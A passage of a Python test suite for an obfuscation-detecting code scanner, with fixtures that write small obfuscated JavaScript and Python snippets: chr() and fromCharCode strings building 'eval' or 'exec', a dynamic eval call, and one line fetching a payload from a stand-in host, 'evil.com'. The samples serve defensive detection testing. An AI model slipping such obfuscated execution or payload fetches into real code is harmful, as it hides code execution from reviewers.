        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var url = String.fromCharCode(104, 116, 116, 112, 58, 47, 47);
fetch(url + "evil.com/payload");
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        # The 'CharCode' in 'fromCharCode' triggers the keyboard FP pattern
        charcode_findings = [
            f for f in result.findings if f.rule_id == "OBF-CHARCODE-001"
        ]
        assert len(charcode_findings) == 0

    @pytest.mark.asyncio
    async def test_detect_python_chr_concatenation(self, tmp_path):
        """Should detect chr() concatenation in Python (OBF-CHARCODE-002)."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
fn = chr(101)+chr(118)+chr(97)+chr(108)
__builtins__[fn]("print(1)")
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-CHARCODE-002" == f.rule_id), None)
        assert finding is not None
        assert "CWE-94" in finding.cwe_ids

    @pytest.mark.asyncio
    async def test_detect_python_chr_with_spaces(self, tmp_path):
        """Should detect chr() concatenation with varying whitespace."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
fn = chr(101) + chr(120) + chr(101) + chr(99)
getattr(__builtins__, fn)("import os")
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "CHARCODE" in f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_python_chr_five_calls(self, tmp_path):
        """Should detect chr() concatenation with 5 calls."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
fn = chr(101)+chr(118)+chr(97)+chr(108)+chr(40)
exec(fn)
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-CHARCODE-002" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_python_chr_exec_pattern(self, tmp_path):
        """Should detect chr() building 'exec' in Python."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
cmd = chr(101)+chr(120)+chr(101)+chr(99)
getattr(__builtins__, cmd)("import os")
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1

    @pytest.mark.asyncio
    async def test_no_false_positive_single_fromcharcode(self, tmp_path):
        """Should NOT flag String.fromCharCode with a single argument."""
        test_file = tmp_path / "safe.js"
        test_file.write_text('''
// Legitimate: converting a single key code
var char = String.fromCharCode(65);
console.log(char);
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        charcode_findings = [f for f in result.findings if "CHARCODE" in f.rule_id]
        assert len(charcode_findings) == 0

    @pytest.mark.asyncio
    async def test_no_false_positive_single_chr_python(self, tmp_path):
        """Should NOT flag single chr() call in Python."""
        test_file = tmp_path / "safe.py"
        test_file.write_text('''
# Legitimate: converting ASCII value
letter = chr(65)
print(letter)
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        charcode_findings = [f for f in result.findings if "CHARCODE" in f.rule_id]
        assert len(charcode_findings) == 0

    @pytest.mark.asyncio
    async def test_no_false_positive_two_chr_python(self, tmp_path):
        """Should NOT flag only two chr() calls concatenated in Python."""
        test_file = tmp_path / "safe.py"
        test_file.write_text('''
# Only two chr() calls - not enough for obfuscation detection
pair = chr(65) + chr(66)
print(pair)
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        charcode_findings = [f for f in result.findings if "CHARCODE" in f.rule_id]
        assert len(charcode_findings) == 0


# =============================================================================
# SCANNING CONFIGURATION & EDGE CASES
# =============================================================================


class TestScannerConfig:
    """Tests for scanner configuration and edge cases."""

    @pytest.mark.asyncio
    async def test_scan_directory(self, tmp_path):
        """Should scan all supported files in a directory."""
        js_file = tmp_path / "evil.js"
        js_file.write_text('''
var fn = "ev" + "al";
window[fn]("alert(1)");
''')

        py_file = tmp_path / "evil.py"
        py_file.write_text('''
fn = chr(101)+chr(118)+chr(97)+chr(108)
__builtins__[fn]("print(1)")
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(tmp_path)

        assert result.files_scanned >= 2
        assert len(result.findings) >= 2

    @pytest.mark.asyncio
    async def test_unsupported_file_extension(self, tmp_path):
        """Should skip unsupported file extensions."""
        test_file = tmp_path / "file.txt"
        test_file.write_text('''
var fn = "ev" + "al";
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) == 0

    @pytest.mark.asyncio
    async def test_exclude_categories_config(self, tmp_path):
        """Should respect exclude_categories in config."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var fn = "ev" + "al";
window[fn]("alert(1)");
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(
            test_file,
            config={"exclude_categories": ["obfuscation_concat"]},
        )

        concat_findings = [f for f in result.findings if "CONCAT" in f.rule_id]
        assert len(concat_findings) == 0

    @pytest.mark.asyncio
    async def test_exclude_multiple_categories(self, tmp_path):
        """Should respect excluding multiple categories."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text(r'''
var fn = "ev" + "al";
var encoded = "\x65\x76\x61\x6c";
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(
            test_file,
            config={
                "exclude_categories": [
                    "obfuscation_concat",
                    "obfuscation_encode",
                ],
            },
        )

        concat_findings = [f for f in result.findings if "CONCAT" in f.rule_id]
        encode_findings = [f for f in result.findings if "ENCODE" in f.rule_id]
        assert len(concat_findings) == 0
        assert len(encode_findings) == 0

    @pytest.mark.asyncio
    async def test_min_confidence_config(self, tmp_path):
        """Should respect min_confidence in config."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var _0x4a3f8b = function() { return true; };
''')

        scanner = ObfuscationDetector()
        # Entropy rules have confidence 0.4, setting min to 0.9 should filter them
        result = await scanner.scan(
            test_file,
            config={"min_confidence": 0.9},
        )

        entropy_findings = [f for f in result.findings if "ENTROPY" in f.rule_id]
        assert len(entropy_findings) == 0

    @pytest.mark.asyncio
    async def test_scan_result_metadata(self, tmp_path):
        """Should return proper scan result metadata."""
        test_file = tmp_path / "test.js"
        test_file.write_text('var x = 1;')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert result.scanner == ScannerType.OBFUSCATION
        assert result.scanner_version == "1.0.0"
        assert result.scan_duration_ms >= 0
        assert result.files_scanned == 1
        assert result.started_at is not None
        assert result.completed_at is not None

    @pytest.mark.asyncio
    async def test_findings_have_location(self, tmp_path):
        """Should include location info in findings."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var fn = "ev" + "al";
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = result.findings[0]
        assert finding.location is not None
        assert finding.location.start_line >= 1
        assert finding.location.snippet is not None

    @pytest.mark.asyncio
    async def test_findings_have_tags(self, tmp_path):
        """Should include tags in findings."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var fn = "ev" + "al";
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = result.findings[0]
        assert "obfuscation" in finding.tags
        assert "lang:javascript" in finding.tags

    @pytest.mark.asyncio
    async def test_findings_have_suggested_fixes(self, tmp_path):
        """Should include suggested fixes in findings."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var fn = "ev" + "al";
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = result.findings[0]
        assert len(finding.suggested_fixes) >= 1
        assert finding.suggested_fixes[0].description

    @pytest.mark.asyncio
    async def test_empty_file(self, tmp_path):
        """Should handle empty files without errors."""
        test_file = tmp_path / "empty.js"
        test_file.write_text('')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) == 0
        assert len(result.errors) == 0

    @pytest.mark.asyncio
    async def test_language_detection_jsx(self, tmp_path):
        """Should detect JavaScript language for .jsx files."""
        test_file = tmp_path / "component.jsx"
        test_file.write_text('''
var fn = "ev" + "al";
window[fn]("payload");
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = result.findings[0]
        assert "lang:javascript" in finding.tags

    @pytest.mark.asyncio
    async def test_language_detection_pyw(self, tmp_path):
        """Should detect Python language for .pyw files."""
        test_file = tmp_path / "script.pyw"
        test_file.write_text('''
fn = chr(101)+chr(118)+chr(97)+chr(108)
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = result.findings[0]
        assert "lang:python" in finding.tags

    @pytest.mark.asyncio
    async def test_scan_result_errors_on_bad_file(self, tmp_path):
        """Should record errors for unreadable files gracefully."""
        # Scan a non-existent directory - this should produce 0 findings
        scanner = ObfuscationDetector()
        result = await scanner.scan(tmp_path / "nonexistent.js")

        # Scanner counts the file but finds no language match or content
        assert result.files_scanned <= 1
